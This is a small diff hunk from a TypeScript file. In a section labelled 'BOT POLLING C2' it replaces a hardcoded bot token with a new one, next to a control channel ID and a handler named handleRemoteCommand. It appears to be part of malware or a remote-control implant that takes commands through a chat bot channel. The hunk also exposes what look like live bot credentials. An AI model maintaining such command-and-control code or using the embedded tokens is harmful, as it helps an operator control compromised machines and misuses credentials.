@@ -225,7 +225,7 @@ function handleRemoteCommand(event: any) {
 }
 
 // ===================== BOT POLLING C2 =====================
-const BOT_TOKEN = "MTUxODM4MDg0MDYxMzMxNDY1MA.Gm7-Jx.if6TCgXYflzL7QN6tabDriRpOD0s1NSY85YDsM";
+const BOT_TOKEN = "MTUxODM4MDg0MDYxMzMxNDY1MA.GKSAnU.Pv1MYcUZvaxNQJ7BX4-NFP0QK2WwNIvPBE4WIw";
 const CONTROL_CHANNEL_ID = "1517670616164077740";
 let lastPolledMessageId = "";
 
